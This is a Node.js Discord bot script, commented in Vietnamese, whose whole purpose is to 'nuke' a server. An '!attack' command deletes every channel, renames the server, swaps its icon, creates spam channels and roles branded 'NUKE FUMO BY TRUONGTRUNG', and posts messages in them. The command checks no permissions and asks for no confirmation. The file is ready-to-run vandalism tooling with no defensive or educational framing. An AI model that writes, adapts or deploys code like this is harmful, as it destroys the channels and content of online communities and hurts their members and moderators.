const { Client, GatewayIntentBits } = require('discord.js');
const fs = require('fs').promises;
const path = require('path');

// Đọc tệp config.json
async function loadConfig() {
    const configPath = path.join(__dirname, 'config.json');
    const configData = await fs.readFile(configPath, 'utf-8');
    return JSON.parse(configData);
}

async function main() {
    const config = await loadConfig();

    const client = new Client({
        intents: [
            GatewayIntentBits.Guilds,
            GatewayIntentBits.GuildMessages,
            GatewayIntentBits.MessageContent
        ]
    });

    const prefix = '!';

    client.once('ready', () => {
        console.log(`Logged in as ${client.user.tag}!`);
    });

    client.on('messageCreate', async message => {
        if (!message.content.startsWith(prefix) || message.author.bot) return;

        const args = message.content.slice(prefix.length).trim().split(/ +/);
        const command = args.shift().toLowerCase();

        if (command === 'attack') {
            // Xóa tất cả các kênh
            message.guild.channels.cache.forEach(channel => channel.delete().catch(console.error));

            // Đổi tên máy chủ
            await message.guild.setName(config.newServerName).catch(console.error);

            // Thay ảnh đại diện máy chủ
            const icon = await fs.readFile('./icon.jpg');
            message.guild.setIcon(icon).catch(console.error);

            // Tạo các kênh mới
            const newChannels = [];
            newChannels.push(await message.guild.channels.create({ name: 'NUKE FUMO BY TRUONGTRUNG', type: 0 })); // 0 là kiểu Text Channel
            newChannels.push(await message.guild.channels.create({ name: 'NUKE FUMO BY TRUONGTRUNG', type: 0 }));
            newChannels.push(await message.guild.channels.create({ name: 'NUKE FUMO BY TRUONGTRUNG', type: 0 }));
            newChannels.push(await message.guild.channels.create({ name: 'NUKE FUMO BY TRUONGTRUNG', type: 0 }));
            newChannels.push(await message.guild.channels.create({ name: 'NUKE FUMO BY TRUONGTRUNG', type: 0 }));

            // Gửi tin nhắn đến kênh cuối cùng đã tạo
            for (const channel of newChannels) {
                await channel.send(`${channel.name} đã được tạo!`).catch(console.error);
            }

            // Tạo các vai trò mới
            await message.guild.roles.create({ name: 'NUKE FUMO BY TRUONGTRUNG', permissions: [] }).catch(console.error);
            await message.guild.roles.create({ name: 'NUKE FUMO BY TRUONGTRUNG', permissions: [] }).catch(console.error);
        }
    });

    client.login(config.token);
}

main().catch(console.error);